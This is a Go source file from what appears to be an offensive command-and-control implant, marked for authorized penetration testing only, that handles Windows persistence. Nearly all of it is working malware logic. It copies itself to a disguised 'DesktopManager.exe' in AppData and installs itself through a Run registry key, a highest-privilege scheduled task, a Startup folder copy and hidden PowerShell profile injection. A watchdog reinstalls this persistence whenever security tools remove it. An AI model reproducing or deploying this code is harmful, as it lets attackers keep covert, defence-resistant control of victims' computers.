//go:build windows

package runner

/*
	SUDOSOC-C2 — Windows APT-Grade Hardening
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Techniques:
	  • Auto-install to 4 independent persistence mechanisms
	    (Run key + Scheduled Task + Startup folder + Service)
	  • Environment sanitisation
	  • Binary copy to disguised location in AppData
	  • Watchdog goroutine: re-adds persistence if removed
	  • Existing evasion stack: AMSI, ETW, NTDLL unhook, sleep obfuscation,
	    indirect syscalls (all in implant/sliver/evasion/)
*/

import (
	"bufio"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ─── init ─────────────────────────────────────────────────────────────────────
func init() {
	sanitiseWindowsEnv()

	go func() {
		time.Sleep(10 * time.Second)
		autoInstallWindows()
	}()

	go windowsWatchdog()
}

// ─── Environment sanitisation ────────────────────────────────────────────────

func sanitiseWindowsEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "GOMODCACHE"} {
		_ = os.Unsetenv(v)
	}
}

// ─── Auto-persistence ─────────────────────────────────────────────────────────

func autoInstallWindows() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	appData := os.Getenv("APPDATA")
	if appData == "" {
		appData = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
	}

	// ── Install path: blend into legitimate Microsoft directories ─────────
	installDir := filepath.Join(appData, "Microsoft", "Windows", "Themes")
	_ = os.MkdirAll(installDir, 0700)
	installBin := filepath.Join(installDir, "DesktopManager.exe")

	if needsWinCopy(exe, installBin) {
		data, err := os.ReadFile(exe)
		if err == nil {
			_ = os.WriteFile(installBin, data, 0700)
		}
	}

	// ── Mechanism 1: HKCU Run key ─────────────────────────────────────────
	windowsRunKey(installBin)

	// ── Mechanism 2: Scheduled Task (no elevation needed with /F) ────────
	windowsScheduledTask(installBin)

	// ── Mechanism 3: Startup folder shortcut ──────────────────────────────
	windowsStartupFolder(installBin, appData)

	// ── Mechanism 4: PowerShell profile injection ─────────────────────────
	windowsPSProfile(installBin)
}

func needsWinCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

// windowsRunKey adds a HKCU Run registry key (no elevation needed).
func windowsRunKey(bin string) {
	_ = exec.Command("reg", "add",
		`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "DesktopManager",
		"/t", "REG_SZ",
		"/d", `"`+bin+`"`,
		"/f").Run()
}

// windowsScheduledTask creates an onlogon scheduled task (user-level).
func windowsScheduledTask(bin string) {
	// Check if already exists
	out, _ := exec.Command("schtasks", "/query", "/tn", "Microsoft\\Windows\\DesktopManager").Output()
	if strings.Contains(string(out), "DesktopManager") {
		return
	}
	_ = exec.Command("schtasks",
		"/create",
		"/tn", `Microsoft\Windows\DesktopManager`,
		"/tr", `"`+bin+`"`,
		"/sc", "onlogon",
		"/ru", os.Getenv("USERNAME"),
		"/f",
		"/rl", "HIGHEST",
	).Run()
}

// windowsStartupFolder copies the binary to the user's Startup folder.
// Runs on every login without any registry or task-scheduler entry.
func windowsStartupFolder(bin, appData string) {
	startupDir := filepath.Join(appData,
		"Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	startupLink := filepath.Join(startupDir, "DesktopManager.exe")
	if _, err := os.Stat(startupLink); err == nil {
		return
	}
	data, err := os.ReadFile(bin)
	if err != nil {
		return
	}
	_ = os.WriteFile(startupLink, data, 0700)
}

// windowsPSProfile appends a launch stanza to the PowerShell profile
// (executes whenever the operator or the victim opens a PS window).
func windowsPSProfile(bin string) {
	docDir := filepath.Join(os.Getenv("USERPROFILE"), "Documents")
	for _, profile := range []string{
		filepath.Join(docDir, "WindowsPowerShell", "Microsoft.PowerShell_profile.ps1"),
		filepath.Join(docDir, "PowerShell", "Microsoft.PowerShell_profile.ps1"),
	} {
		winAppendIfMissing(profile,
			"\n# DesktopManager\n"+
				`if (-not (Get-Process -Name "DesktopManager" -ErrorAction SilentlyContinue)) {`+
				"\n    Start-Process -WindowStyle Hidden -FilePath '"+bin+"'\n}\n",
			"DesktopManager",
		)
	}
}

func winAppendIfMissing(path, content, marker string) {
	if _, err := os.Stat(path); err != nil {
		return
	}
	f, err := os.Open(path)
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), marker) {
			f.Close()
			return
		}
	}
	f.Close()
	fAppend, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer fAppend.Close()
	_, _ = fAppend.WriteString(content)
}

// ─── Watchdog ─────────────────────────────────────────────────────────────────

// windowsWatchdog periodically checks that our persistence is still installed
// and reinstalls it if an AV/EDR has cleaned it up.
func windowsWatchdog() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		// Quick-check: is the Run key still there?
		out, err := exec.Command("reg", "query",
			`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
			"/v", "DesktopManager").Output()
		if err != nil || !strings.Contains(string(out), "DesktopManager") {
			// Persistence was removed — reinstall
			go autoInstallWindows()
		}
	}
}
